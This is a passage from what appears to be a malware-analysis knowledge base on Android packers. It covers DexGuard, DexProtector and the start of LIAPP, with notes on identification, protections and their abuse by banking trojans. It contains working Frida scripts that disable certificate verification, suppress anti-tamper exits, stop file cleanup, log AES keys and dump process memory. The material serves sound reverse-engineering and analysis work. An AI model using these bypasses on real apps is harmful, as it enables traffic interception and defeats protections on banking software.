Frida string log as a lookup table to annotate JADX output\n8. For remaining encrypted strings, call the decryption method directly via Frida RPC\n</code></pre> <p>For step 8, Frida RPC allows calling DexGuard decryption functions on demand:</p> <pre><code>rpc.exports = {\n    decrypt: function(className, methodName, hexBytes) {\n        var result = null;\n        Java.perform(function() {\n            var cls = Java.use(className);\n            var bytes = Java.array(\"byte\", hexBytes.match(/.{2}/g).map(function(b) {\n                return parseInt(b, 16);\n            }));\n            result = cls[methodName](bytes);\n        });\n        return result;\n    }\n};\n</code></pre>"},{"location":"packers/dexguard/#automated-dex-dumping-with-frida-dexdump","title":"Automated DEX Dumping with frida-dexdump","text":"<p>frida-dexdump automates the process of scanning process memory for DEX headers and dumping all loaded DEX files. For DexGuard-protected apps, run it after the app has fully initialized to ensure all encrypted classes have been loaded:</p> <pre><code>frida-dexdump -FU\n</code></pre> <p>The <code>-F</code> flag attaches to the foreground app and <code>-U</code> targets a USB-connected device. The tool produces multiple DEX files in the current directory. Some will be framework DEX files -- filter by size and content to identify the application-specific ones. Load the dumped DEX files into JADX for analysis without DexGuard's encryption layer.</p>"},{"location":"packers/dexguard/#bypass-environmental-checks","title":"Bypass Environmental Checks","text":"<p>Hook and return false for all detection methods. Objection's <code>android sslpinning disable</code> and <code>android root disable</code> handle common DexGuard patterns.</p>"},{"location":"packers/dexguard/#malware-usage","title":"Malware Usage","text":"<p>DexGuard is less commonly seen in malware than Chinese packers (Bangcle, Tencent Legu, Qihoo 360) due to its commercial licensing model. However, cracked or leaked versions have appeared in:</p> <ul> <li>Banking trojans targeting European institutions</li> <li>Samples where the original app was legitimately DexGuard-protected and then repackaged with malicious code</li> <li>High-value targeted campaigns where operators invest in professional tools</li> </ul> <p>The protector is more commonly encountered when analyzing legitimate banking and financial apps (the defensive side) rather than the malware itself.</p>"},{"location":"packers/dexguard/#known-family-usage","title":"Known Family Usage","text":"Family Usage Context Anatsa DexGuard-protected droppers on Google Play. String encryption conceals C2 URLs and ATS configuration. Xenomorph v3 samples used DexGuard for string and class encryption. ATS scripting engine encrypted behind class loader. Medusa Some MaaS builds distributed with DexGuard protection to affiliates. Chameleon Earlier variants used DexGuard-style string encryption (potentially cracked version)."},{"location":"packers/dexguard/#versions-and-evolution","title":"Versions and Evolution","text":""},{"location":"packers/dexguard/#versioning","title":"Versioning","text":"<p>DexGuard's version numbering tracks closely with ProGuard releases, since DexGuard is built on top of the ProGuard codebase. Major DexGuard versions correspond to the ProGuard version they extend. Guardsquare releases updates quarterly, adding new detection vectors and obfuscation techniques in each cycle.</p>"},{"location":"packers/dexguard/#cracked-versions-in-the-wild","title":"Cracked Versions in the Wild","text":"<p>Cracked DexGuard copies circulate on underground forums and Telegram channels, primarily versions from 2018--2021. These leaked builds are the primary source of DexGuard-protected malware, since legitimate licensing requires a direct Guardsquare contract.</p> <p>Key differences between cracked and current versions:</p> Aspect Cracked (Leaked) Current (Licensed) Polymorphism Missing or limited -- builds produce similar output Full per-build variation Detection vectors Older checks (no modern Frida/Magisk detection) Continuously updated detection String encryption Basic XOR patterns Advanced multi-layer encryption Config format Older directive syntax Extended directives for new features Gradle compatibility Often locked to older Gradle/AGP versions Supports current Android build toolchain <p>For malware analysts, this distinction matters. Samples using cracked DexGuard are significantly easier to unpack because the obfuscation is weaker and patterns are consistent across samples built with the same leaked version. If a Frida hook works on one sample from a cracked build, it likely works on others from the same version.</p>"},{"location":"packers/dexguard/#evolution-of-detection-capabilities","title":"Evolution of Detection Capabilities","text":"<p>DexGuard's environmental detection has expanded over time:</p> <ul> <li>Pre-2019: Basic root checks (<code>su</code> binary, known package names), ptrace-based debugger detection</li> <li>2019--2020: Added Magisk detection, Frida port scanning, Xposed class inspection</li> <li>2021--2022: Added Magisk module detection, frida-gadget in maps detection, named pipe scanning</li> <li>2023+: Added MagiskHide/Shamiko detection, Frida stalker detection, multiple frida-server signature checks, zygisk module awareness</li> </ul> <p>Older cracked versions lack the later detection layers entirely, which is why samples built with leaked DexGuard often run without issues on rooted devices with modern Frida setups.</p>"},{"location":"packers/dexguard/#analyst-workflow","title":"Analyst Workflow","text":"<p>Step-by-step approach for DexGuard-protected samples:</p> <pre><code>1. Run APKiD -&gt; confirm DexGuard detection\n2. Open in jadx -&gt; look for o/oo/ooo classes with byte[] -&gt; String methods\n3. Install on device/emulator\n4. Attach Frida, hook string decryption classes (script above)\n5. Run the app -&gt; capture all decrypted strings (C2 URLs, API keys, target app list)\n6. If class encryption present -&gt; use frida-dexdump to dump loaded DEX\n7. Decompile dumped DEX normally\n8. For environmental checks -&gt; use Objection or custom Frida hooks to bypass\n</code></pre> <p>For legitimate app analysis (banking app security assessment), the same unpacking approach applies. The key difference is that legitimate apps typically have more layers of protection active simultaneously, including tamper detection that may need hooking before the target functionality is reachable.</p>"},{"location":"packers/dexguard/#advanced-analysis-techniques","title":"Advanced Analysis Techniques","text":""},{"location":"packers/dexguard/#identifying-dexguard-version-from-build-artifacts","title":"Identifying DexGuard Version from Build Artifacts","text":"<p>Cracked DexGuard builds leave version-specific fingerprints:</p> Indicator How to Check String decryption class count Older versions (pre-2020): 1-2 classes. Newer: 3+ with delegation chains Encryption algorithm v8.x: XOR-based. v9.x+: AES with CBC mode. Identifiable by key schedule in bytecode Native library name <code>libdexguard.so</code> in older, obfuscated names in v9+ ProGuard rule compatibility Cracked versions often tied to specific AGP/Gradle ranges Detection callback pattern Pre-2021: direct <code>System.exit</code>. Post-2021: delayed callback through registered handler <p>To fingerprint programmatically, decompile with JADX and count the number of single-character class names with <code>byte[]</code> to <code>String</code> methods. Cross-reference with known cracked version distribution dates from underground forum timestamps.</p>"},{"location":"packers/dexguard/#automated-string-decryption-pipeline","title":"Automated String Decryption Pipeline","text":"<p>For batch analysis across multiple DexGuard-protected samples:</p> <pre><code>rpc.exports = {\n    decryptAll: function() {\n        var results = {};\n        Java.perform(function() {\n            Java.enumerateLoadedClasses({\n                onMatch: function(className) {\n                    if (!className.match(/^[a-z]{1,3}(\\.[a-z]{1,3})*$/)) return;\n                    try {\n                        var cls = Java.use(className);\n                        var methods = cls.class.getDeclaredMethods();\n                        methods.forEach(function(method) {\n                            if (method.getReturnType().getName() !== \"java.lang.String\") return;\n                            var params = method.getParameterTypes();\n                            if (params.length !== 1) return;\n                            if (params[0].getName() !== \"[B\") return;\n                            var methodName = method.getName();\n                            var original = cls[methodName].overload(\"[B\");\n                            cls[methodName].overload(\"[B\").implementation = function(arr) {\n                                var result = original.call(this, arr);\n                                if (!results[className]) results[className] = [];\n                                results[className].push(result.toString());\n                                return result;\n                            };\n                        });\n                    } catch(e) {}\n                },\n                onComplete: function() {}\n            });\n        });\n        return results;\n    },\n\n    getResults: function() {\n        return JSON.stringify(this._results || {});\n    }\n};\n</code></pre> <p>Drive this from a Python script using <code>frida.get_usb_device().attach(pid)</code> to batch-process multiple APKs. Export results as JSON for IOC extraction.</p>"},{"location":"packers/dexguard/#breaking-native-ssl-pinning-without-known-class-names","title":"Breaking Native SSL Pinning Without Known Class Names","text":"<p>DexGuard's polymorphism means the SSL pinning class name changes per build. Instead of targeting a known class, hook at the OpenSSL level:</p> <pre><code>var SSL_CTX_set_verify = Module.findExportByName(\"libssl.so\", \"SSL_CTX_set_verify\");\nif (SSL_CTX_set_verify) {\n    Interceptor.attach(SSL_CTX_set_verify, {\n        onEnter: function(args) {\n            args[1] = ptr(0);\n            args[2] = ptr(0);\n        }\n    });\n}\n\nvar SSL_set_verify = Module.findExportByName(\"libssl.so\", \"SSL_set_verify\");\nif (SSL_set_verify) {\n    Interceptor.attach(SSL_set_verify, {\n        onEnter: function(args) {\n            args[1] = ptr(0);\n            args[2] = ptr(0);\n        }\n    });\n}\n\nvar X509_verify_cert = Module.findExportByName(\"libcrypto.so\", \"X509_verify_cert\");\nif (X509_verify_cert) {\n    Interceptor.attach(X509_verify_cert, {\n        onLeave: function(retval) {\n            retval.replace(1);\n        }\n    });\n}\n</code></pre> <p>This bypasses all certificate verification regardless of whether DexGuard's pinning uses Java-level <code>TrustManager</code>, native BoringSSL callbacks, or custom verification. Combined with installing a CA certificate in the system trust store (via Magisk module MagiskTrustUserCerts), this provides complete HTTPS interception.</p> <p>For DexGuard builds that also pin at the Java <code>HttpsURLConnection</code> or OkHttp level, add reFrida SSL pinning bypass snippets which enumerate all <code>TrustManager</code> implementations dynamically rather than targeting hardcoded class names.</p>"},{"location":"packers/dexguard/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature DexGuard Virbox Chinese Packers String encryption AES/XOR with method-level keys VM-based, part of virtualization Basic XOR in native layer Class encryption Custom class loader Full DEX virtualization DEX-in-assets encryption Code virtualization Optional, limited methods Core feature, full DEX Not available Anti-debug Comprehensive (ptrace, JDWP, Frida) Moderate (ptrace, debug flags) Basic (ptrace) Unpacking difficulty Medium (Frida hooks effective) High (VM interpretation needed) Low (standard DEX dump) Cost to attacker High (commercial, cracked copies rare) Medium (Chinese market pricing) Free"},{"location":"packers/dexguard/#references","title":"References","text":"<ul> <li>Guardsquare DexGuard</li> <li>Guardsquare Blog -- Mobile Application Protection</li> <li>APKiD DexGuard Signatures</li> <li>ThreatFabric -- Android Banking Trojan Reports</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>reFrida -- Frida Script Collection</li> <li>Guardsquare -- DexGuard vs ProGuard Comparison</li> <li>OWASP MASTG -- Android Reverse Engineering</li> <li>Objection -- Runtime Mobile Exploration</li> </ul>"},{"location":"packers/dexprotector/","title":"DexProtector","text":"<p>DexProtector is a commercial Android and iOS application protector developed by Licel. It applies encryption, obfuscation, and native bridging at the bytecode and native levels, combined with a full RASP (Runtime Application Self-Protection) suite. Unlike obfuscation-focused tools such as DexGuard, DexProtector's core strength is its layered runtime protection and asset encryption via vtable hooking in <code>libandroidfw.so</code>. EMVCo-certified for six consecutive years, it is primarily deployed in mobile payments, banking, and fintech applications.</p>"},{"location":"packers/dexprotector/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Licel Origin United States (Los Angeles HQ, London office) Type Commercial Packer/Protector/RASP Platforms Android (4.4+), iOS (11.0+), Apple Watch Certifications EMVCo SBMP SPT (6 consecutive years), PCI MPoC compliant Scale 12+ billion downloads across 85 countries Website licelus.com"},{"location":"packers/dexprotector/#identification","title":"Identification","text":""},{"location":"packers/dexprotector/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD identifies DexProtector through native library naming patterns and asset file signatures:</p> <pre><code>packer : DexProtector\nobfuscator : DexProtector\n</code></pre> <p>The primary detection regex matches native libraries across architectures:</p> <pre><code>/lib\\/(arm.*|x86.*)\\/libdexprotector\\.[A-Za-z0-9.]{2,16}\\.so/\n</code></pre>"},{"location":"packers/dexprotector/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>libdexprotector.XX.so</code> Main protection library (XX = version digits) <code>libdexprotector_h.so</code> Alternate library naming <code>libdpboot.so</code> Bootstrap loader, loaded first via <code>System.loadLibrary(\"dpboot\")</code> <code>libdp.so</code> Key generation and asset vtable hooking library <code>assets/dp.mp3</code> Encrypted index file mapping method/field indexes to hidden targets <code>assets/dp.arm.so.dat</code> Encrypted native payload (ARM generic) <code>assets/dp.arm-v7.so.dat</code> Encrypted native payload (ARMv7) <code>assets/dp.arm-v8.so.dat</code> Encrypted native payload (ARMv8/ARM64) <code>assets/dp.x86.so.dat</code> Encrypted native payload (x86) <code>META-INF/MANIFEST.MF</code> Contains <code>Protected-By: &lt;version&gt; DexProtector (&lt;date&gt;)</code> <code>dexpro-build.properties</code> Build metadata with version, detection flags configuration"},{"location":"packers/dexprotector/#dexprotector-for-aide-variant","title":"DexProtector for AIDE Variant","text":"<p>A variant targeting AIDE (Android IDE) uses distinct artifacts:</p> Artifact Description <code>assets/classes.dex.dat</code> Encrypted DEX payload <code>assets/eprotect.dat</code> Protection configuration data <code>assets/dp-lib/dp.kotlin-v1.lua.mph</code> Kotlin-specific protection library"},{"location":"packers/dexprotector/#version-identification","title":"Version Identification","text":"<p>The <code>META-INF/MANIFEST.MF</code> entry reveals the exact DexProtector version:</p> <pre><code>Protected-By: 12.3.19 DexProtector (20211214)\n</code></pre> <p>The <code>dexpro-build.properties</code> file contains build configuration:</p> <pre><code>build.version_name=: 1.5 (Beta)\nbuild.version_code=: 15\nreverse.detection=true\nhooks.detection=true\ndevice.detection=true\nsignature.detection=true\n</code></pre>"},{"location":"packers/dexprotector/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/dexprotector/#native-library-loading-chain","title":"Native Library Loading Chain","text":"<p>DexProtector uses a multi-stage native library loading sequence during <code>attachBaseContext</code>:</p> <pre><code>Application.attachBaseContext()\n  \u2514\u2500 System.loadLibrary(\"dpboot\")     \u2192 loads libdpboot.so\n       \u2514\u2500 JNI: loadLibrary(\"dexprotector\") \u2192 loads libdexprotector.so\n            \u2514\u2500 Custom ELF loader           \u2192 decrypts and maps final payload\n                 \u2514\u2500 libdp.so               \u2192 master key generation + vtable hooking\n</code></pre> <p>Each stage handles a specific responsibility: <code>libdpboot.so</code> bootstraps the chain, <code>libdexprotector.so</code> acts as a custom ELF loader that decrypts the protected payload into memory, and <code>libdp.so</code> generates the 32-byte master key used to derive all subkeys for asset decryption.</p>"},{"location":"packers/dexprotector/#asset-encryption-and-vtable-hooking","title":"Asset Encryption and VTable Hooking","text":"<p>DexProtector's most distinctive technique is intercepting Android's native asset loading at the framework level. During initialization, <code>libdp.so</code> modifies the vtable of <code>android::_FileAsset</code> inside <code>libandroidfw.so</code>, replacing virtual function pointers to intercept all asset read operations.</p> <p>When the application accesses any encrypted asset file, DexProtector's intercepted vtable entries decrypt and decompress the content on the fly. The decryption key and nonce are distributed across the file header and a subkey derived from the 32-byte master key. This provides transparent decryption -- the Java layer receives plaintext without any awareness of the encryption layer.</p>"},{"location":"packers/dexprotector/#class-and-dex-encryption","title":"Class and DEX Encryption","text":"<p>Entire DEX files or selected classes are encrypted and stored within the APK. At runtime, the native layer decrypts the DEX payload and loads it through a custom class loader. On ART, the decrypted output may be written as <code>.odex</code> or <code>.dat</code> files temporarily before loading.</p>"},{"location":"packers/dexprotector/#string-encryption","title":"String Encryption","text":"<p>String literals are replaced with native bridge calls that accept an encrypted index parameter. DexProtector uses strong cryptographic algorithms with dynamic keys derived from multiple runtime parameters, making key extraction from static analysis infeasible. White-box cryptography protects the key material from memory inspection.</p>"},{"location":"packers/dexprotector/#hide-access-methodfield-virtualization","title":"Hide Access (Method/Field Virtualization)","text":"<p>When a method call or field access requires protection, DexProtector replaces the instruction with a call to a native bridge function:</p> <pre><code>LibLiveNetTV.i(0x42, arg1, arg2);\n</code></pre> <p>The first parameter is an index resolved against the decrypted <code>assets/dp.mp3</code> file, which maps indexes to the actual methods or fields. This native <code>invokedynamic</code> engine hides the call graph entirely from static analysis tools like JADX and Ghidra.</p>"},{"location":"packers/dexprotector/#resource-and-asset-encryption","title":"Resource and Asset Encryption","text":"<p>Layout XML files, drawables, raw resources, and arbitrary assets are encrypted within the APK. Decryption is handled transparently through the vtable-hooked <code>AssetManager</code>, meaning the application code accesses resources normally while DexProtector handles decryption at the native layer.</p>"},{"location":"packers/dexprotector/#native-code-protection","title":"Native Code Protection","text":"<ul> <li>ELF section encryption (<code>.text</code> section of <code>.so</code> files)</li> <li>JNI bridge obfuscation</li> <li>Symbol stripping and import/export hiding</li> <li>Native library encryption with architecture-specific <code>.dat</code> payloads</li> </ul>"},{"location":"packers/dexprotector/#anti-debugging","title":"Anti-Debugging","text":"Technique Detection Method ptrace Self-attachment to block external debuggers TracerPid <code>/proc/self/status</code> monitoring Debugger detection IDA Pro, GDB, JEB, LLDB process signatures JDWP Java Debug Wire Protocol state inspection Debug flags <code>android:debuggable</code> manifest attribute checks"},{"location":"packers/dexprotector/#anti-tampering","title":"Anti-Tampering","text":"<p>DexProtector applies encryption-based integrity controls with context-sensitive keys calculated dynamically at runtime. Tampering with any protected component invalidates the derived keys, causing decryption to produce garbage rather than triggering an explicit check-and-fail pattern. This design makes patching significantly harder than simple signature verification bypasses.</p> <p>Additional integrity checks include:</p> <ul> <li>APK certificate verification</li> <li>DEX file hash validation</li> <li>Native library content checks</li> <li>File integrity verification across APK contents</li> </ul>"},{"location":"packers/dexprotector/#anti-hooking-and-anti-instrumentation","title":"Anti-Hooking and Anti-Instrumentation","text":"Target Detection Method Frida Port 27042 scanning, <code>frida-agent</code> in <code>/proc/maps</code>, named pipe detection Xposed <code>XposedBridge</code> class presence, stack trace inspection Substrate Library injection detection SO injection <code>/proc/self/maps</code> monitoring for unexpected libraries"},{"location":"packers/dexprotector/#root-and-environment-detection","title":"Root and Environment Detection","text":"Check Method Root <code>su</code> binary, Magisk, SuperSU, system partition integrity Emulator Build properties, hardware characteristics, telephony state Multi-parallel App cloning and dual-space environment detection Custom firmware ROM fingerprinting, bootloader state"},{"location":"packers/dexprotector/#certificate-pinning-communication-hardening","title":"Certificate Pinning (Communication Hardening)","text":"<p>DexProtector provides built-in public key pinning and Certificate Transparency enforcement, blocking MITM proxies and ensuring data flows only to legitimate endpoints. This operates independently of application-level pinning implementations like OkHttp's <code>CertificatePinner</code>.</p>"},{"location":"packers/dexprotector/#vtee-cryptomodule-white-box-cryptography","title":"vTEE CryptoModule (White-Box Cryptography)","text":"<p>The Licel vTEE (Virtual Trusted Execution Environment) is a software-based secure enclave running inside the application process. Unlike hardware TEEs, it creates a logically isolated execution environment through white-box cryptography. The CryptoModule:</p> <ul> <li>Protects cryptographic key material from memory dumps</li> <li>Provides secure storage with device-binding</li> <li>Handles AES, RSA, and other operations within the white-box implementation</li> <li>Prevents key extraction even with full memory access and debugger control</li> </ul>"},{"location":"packers/dexprotector/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/dexprotector/#rasp-bypass-as-prerequisite","title":"RASP Bypass as Prerequisite","text":"<p>DexProtector's RASP checks run before the application fully initializes. If Frida, root, or an emulator is detected, the app terminates immediately. Bypassing these checks is the first step in any analysis.</p> <p>Spawn the application with Frida in spawn mode and hook early:</p> <pre><code>Java.perform(function() {\n    var System = Java.use(\"java.lang.System\");\n    System.exit.implementation = function(code) {\n        console.log(\"Blocked System.exit(\" + code + \")\");\n    };\n\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exit.implementation = function(code) {\n        console.log(\"Blocked Runtime.exit(\" + code + \")\");\n    };\n});\n</code></pre>"},{"location":"packers/dexprotector/#hooking-the-unlink-call","title":"Hooking the Unlink Call","text":"<p>DexProtector deletes decrypted temporary files after loading. Hooking the native <code>unlink</code> syscall prevents cleanup, leaving decrypted DEX and <code>.odex</code> files on disk:</p> <pre><code>Interceptor.attach(Module.findExportByName(null, \"unlink\"), {\n    onEnter: function(args) {\n        var path = args[0].readUtf8String();\n        console.log(\"unlink: \" + path);\n    },\n    onLeave: function(retval) {\n        retval.replace(0);\n    }\n});\n</code></pre> <p>Returning 0 tricks the process into believing the deletion succeeded while the decrypted files remain accessible at the logged paths.</p>"},{"location":"packers/dexprotector/#dex-dumping-from-memory","title":"DEX Dumping from Memory","text":"<p>Intercept <code>android_dlopen_ext</code> to detect when DexProtector loads its decrypted payload, then dump DEX files from memory:</p> <pre><code>Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n        console.log(\"dlopen: \" + this.path);\n    }\n});\n</code></pre> <p>Tools like frida-dexdump scan process memory for DEX magic bytes (<code>dex\\n035\\0</code>) and dump all loaded DEX files after DexProtector has completed its decryption routine.</p>"},{"location":"packers/dexprotector/#native-bridge-index-extraction","title":"Native Bridge Index Extraction","text":"<p>To recover the hidden call graph, hook the native bridge function and log all index-to-method resolutions:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            try {\n                var cls = Java.use(className);\n                var methods = cls.class.getDeclaredMethods();\n                methods.forEach(function(method) {\n                    if (method.toString().indexOf(\"native\") !== -1) {\n                        console.log(\"Native bridge: \" + className + \".\" + method.getName());\n                    }\n                });\n            } catch(e) {}\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"packers/dexprotector/#dpmp3-decryption","title":"dp.mp3 Decryption","text":"<p>The <code>assets/dp.mp3</code> file contains the encrypted mapping between native bridge indexes and actual method/field targets. After the app initializes, this file is decrypted in memory. Dumping the decrypted content from the process memory reveals the full method resolution table, restoring the original call graph.</p>"},{"location":"packers/dexprotector/#step-by-step-walkthrough","title":"Step-by-Step Walkthrough","text":"<p>Complete DexProtector unpacking workflow targeting the native bridge and vtable hooking:</p> <p>Step 1: Identify the protection version. Check <code>META-INF/MANIFEST.MF</code> for <code>Protected-By:</code> and <code>dexpro-build.properties</code> for detection flags. This determines which bypass techniques are needed.</p> <p>Step 2: Bypass RASP. Use spawn mode (<code>frida -f com.target.app -U</code>) to inject before DexProtector initializes. Block <code>System.exit</code> and <code>Runtime.exit</code> as shown above. If the app still crashes, hook <code>Process.killProcess</code>:</p> <pre><code>Java.perform(function() {\n    var Process = Java.use(\"android.os.Process\");\n    Process.killProcess.implementation = function(pid) {\n        console.log(\"Blocked killProcess(\" + pid + \")\");\n    };\n});\n</code></pre> <p>Step 3: Prevent file cleanup. Hook <code>unlink</code> and <code>remove</code> to preserve decrypted temporary files:</p> <pre><code>[\"unlink\", \"remove\"].forEach(function(fname) {\n    Interceptor.attach(Module.findExportByName(\"libc.so\", fname), {\n        onEnter: function(args) {\n            var path = args[0].readUtf8String();\n            if (path &amp;&amp; (path.indexOf(\".dex\") !== -1 || path.indexOf(\".odex\") !== -1 ||\n                path.indexOf(\".dat\") !== -1)) {\n                console.log(\"[blocked \" + fname + \"] \" + path);\n                this.block = true;\n            }\n        },\n        onLeave: function(retval) {\n            if (this.block) retval.replace(0);\n        }\n    });\n});\n</code></pre> <p>Step 4: Extract the master key. The 32-byte master key in <code>libdp.so</code> is derived during initialization. Hook the key derivation by intercepting AES key schedule operations:</p> <pre><code>var AES_set_encrypt_key = Module.findExportByName(\"libdp.so\", \"AES_set_encrypt_key\");\nif (AES_set_encrypt_key) {\n    Interceptor.attach(AES_set_encrypt_key, {\n        onEnter: function(args) {\n            var keyLen = args[1].toInt32();\n            console.log(\"[AES key] length=\" + keyLen + \" key=\" +\n                args[0].readByteArray(keyLen / 8));\n        }\n    });\n}\n</code></pre> <p>If symbols are stripped, search for the AES S-box constant (<code>0x63, 0x7c, 0x77, 0x7b</code>) in the loaded <code>libdp.so</code> memory to locate the encryption routines via pattern scanning.</p> <p>Step 5: Dump the dp.mp3 mapping table. After the app initializes, <code>dp.mp3</code> is decrypted in memory. Scan process memory for the decrypted mapping structure:</p> <pre><code>Process.enumerateRanges(\"r--\").forEach(function(range) {\n    try {\n        var buf = range.base.readByteArray(Math.min(range.size, 0x10000));\n        var view = new Uint8Array(buf);\n        if (view[0] === 0x00 &amp;&amp; view[1] === 0x00 &amp;&amp; view[4] !== 0x00) {\n            var f = new File(\"/data/local/tmp/dp_dump_\" +\n                range.base.toString() + \".bin\", \"wb\");\n            f.write(range.base.readByteArray(range.size));\n            f.close();\n            console.log(\"Dumped \" + range.size + \" bytes from \" + range.base);\n        }\n    } catch(e) {}\n});\n</code></pre> <p>Step 6: Rebuild call graph. With the dp.mp3 mapping and native bridge hooks, reconstruct which indexes resolve to which methods. The Romain Thomas analysis documents the index structure in detail.</p>"},{"location":"packers/dexprotector/#vtee-key-extraction","title":"vTEE Key Extraction","text":"<p>DexProtector's vTEE CryptoModule uses white-box cryptography to protect key material. The keys are embedded in lookup tables that encode the cryptographic operations. Extracting keys requires:</p> <p>Differential Fault Analysis (DFA): Inject faults into the white-box AES implementation by modifying intermediate values. Bos et al. (2016) demonstrated that DFA can extract AES keys from white-box implementations in minutes. Apply this by using Frida to corrupt specific memory addresses during encryption rounds and analyzing the faulty ciphertexts.</p> <p>Differential Computation Analysis (DCA): Treat the white-box implementation as a black box and apply side-channel analysis techniques. Record memory access traces during encryption, then apply DPA-style statistical analysis to extract key bytes. The SideChannelMarvels/Deadpool project provides tools for this approach.</p> <p>Practical limitations: Licel has hardened vTEE against known white-box attacks in recent versions. Counter-measures include internal encodings, table splitting, and perturbation tables. No public break of current vTEE versions has been published. For practical analysis, bypassing the vTEE entirely (hooking the plaintext before/after encryption) is more reliable than attempting key extraction.</p>"},{"location":"packers/dexprotector/#comparison-with-dexguard","title":"Comparison with DexGuard","text":"Aspect DexProtector DexGuard Vendor Licel Guardsquare Platform Android + iOS Android (iXGuard for iOS) Primary strength RASP + asset encryption via vtable hooking Polymorphic code obfuscation Build integration Post-build (no source code required) Build-time (Gradle plugin, requires source) Obfuscation approach Native bridge hiding + encryption Bytecode-level transformation + encryption Polymorphism No per-build variation Each build produces different obfuscation ProGuard/R8 relationship Compatible as additional layer Extends ProGuard directly White-box crypto Yes (vTEE CryptoModule) No Code virtualization Hide Access (native bridge) Optional VM interpreter EMVCo certification Yes (6 consecutive years) No Scalability of attacks Breaking one instance enables attacks on all protected apps Polymorphism forces per-build analysis <p>The fundamental architectural difference: DexGuard integrates at build time and applies polymorphic transformations, meaning each build produces unique obfuscation patterns. DexProtector operates post-build on the compiled artifact, which means its protection mechanisms are structurally consistent across all protected applications. Successfully reverse engineering DexProtector's native layer for one application provides transferable knowledge to all DexProtector-protected apps.</p>"},{"location":"packers/dexprotector/#malware-usage","title":"Malware Usage","text":"<p>DexProtector is less frequently observed in malware than DexGuard or Chinese packers, but its commercial availability has led to documented abuse.</p>"},{"location":"packers/dexprotector/#known-campaigns","title":"Known Campaigns","text":"Campaign Details Anubis QR Scanner droppers Private Anubis variant distributed via Google Play QR scanner/reader apps (Feb 2020 -- Mar 2021). DexProtector obfuscated the dropper code. Resulted in 30,000+ infections targeting 200+ banking apps and later expanded to 1,200+ targets. BankBot Google Play campaigns Sophisticated BankBot campaigns used DexProtector on Play Store droppers. ThreatFabric noted attackers \"took the time and effort to buy and integrate DexProtector,\" indicating higher technical investment than typical campaigns."},{"location":"packers/dexprotector/#usage-pattern","title":"Usage Pattern","text":"<p>Malware authors who adopt DexProtector typically demonstrate higher operational sophistication. The commercial licensing cost and integration effort filter out lower-tier operators. When DexProtector appears in malware, it usually protects a dropper component distributed through official app stores rather than the final payload itself.</p>"},{"location":"packers/dexprotector/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; check for DexProtector detection\n2. Inspect assets/ -&gt; look for dp.mp3, dp.arm-v7.so.dat, dp.arm-v8.so.dat\n3. Check META-INF/MANIFEST.MF -&gt; \"Protected-By\" header reveals version\n4. Check for dexpro-build.properties -&gt; detection flag configuration\n5. Install on physical device (emulator likely blocked)\n6. Spawn with Frida (spawn mode) -&gt; hook System.exit early\n7. Hook unlink() -&gt; prevent cleanup of decrypted files\n8. Run frida-dexdump -&gt; capture decrypted DEX from memory\n9. Decompile dumped DEX with JADX\n10. For hidden method calls -&gt; hook native bridge functions, log index resolutions\n11. For asset decryption -&gt; dump dp.mp3 contents after init completes\n</code></pre>"},{"location":"packers/dexprotector/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature DexProtector DexGuard Virbox Chinese Packers String encryption White-box crypto, dynamic keys AES/XOR with method-level keys VM-based Basic XOR in native layer DEX encryption Native bridge + vtable asset hooking Custom class loader Full DEX virtualization DEX-in-assets encryption Code virtualization Hide Access (native invokedynamic) Optional VM interpreter Core feature, full DEX Not available Asset encryption vtable hooking in libandroidfw.so Patched AssetManager N/A N/A Anti-debug Comprehensive (ptrace, JDWP, Frida, Xposed) Comprehensive Moderate Basic (ptrace) RASP Core feature, app-terminating Partial Partial None White-box crypto Yes (vTEE CryptoModule) No No No Post-build protection Yes (no source required) No (build-time integration) Yes Yes Unpacking difficulty Medium-Hard Medium Expert (VM) Easy-Medium"},{"location":"packers/dexprotector/#references","title":"References","text":"<ul> <li>Licel DexProtector</li> <li>DexProtector Documentation</li> <li>A Glimpse Into DexProtector -- Romain Thomas</li> <li>APKiD DexProtector Signatures</li> <li>Android_Dump_Dex -- Frida-based DexProtector dumper</li> <li>DexProtector EMVCo Certification</li> <li>SGSecure DexProtector Analysis</li> <li>ThreatFabric -- Anubis QR Scanner Campaigns</li> <li>ThreatFabric -- BankBot Google Play Campaigns</li> </ul>"},{"location":"packers/liapp/","title":"LIAPP","text":"<p>LIAPP is a commercial RASP and packer solution developed by Lockin Company (Seoul, South Korea). It combines DEX encryption, native library protection, and aggressive runtime self-protection into a hybrid product that functions as both a packer and a RASP framework. Recognized by Gartner for application shielding, LIAPP reports over 150 million device installations across 45,000+ applications. Among Korean-origin protectors, LIAPP is consistently described as one of the hardest to bypass on modding and reverse engineering forums.</p>"},{"location":"packers/liapp/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Lockin Company Origin Seoul, South Korea Type Commercial Packer + RASP Platforms Android, iOS Products LIAPP (mobile apps), LIAPP for Game (Unity engine), LIAPP Enterprise Scale 150M+ device installations, 45K+ protected apps Recognition Gartner-recognized for application shielding Website liapp.lockincomp.com"},{"location":"packers/liapp/#identification","title":"Identification","text":""},{"location":"packers/liapp/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detection for LIAPP is not yet implemented. This is tracked as APKiD issue #339. Manual identification is required.</p>"},{"location":"packers/liapp/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>com.lockincomp.*</code> Package references in manifest or DEX (when not fully encrypted) Native libraries Names not well-documented publicly; XOR-encrypted strings within <code>.so</code> files make signature matching difficult Encrypted assets Encrypted DEX payloads stored in assets directory XOR-encrypted strings All meaningful strings in native libraries are XOR-encrypted, requiring decryption before static analysis yields useful results"},{"location":"packers/liapp/#static-identification-challenges","title":"Static Identification Challenges","text":"<p>LIAPP is harder to fingerprint 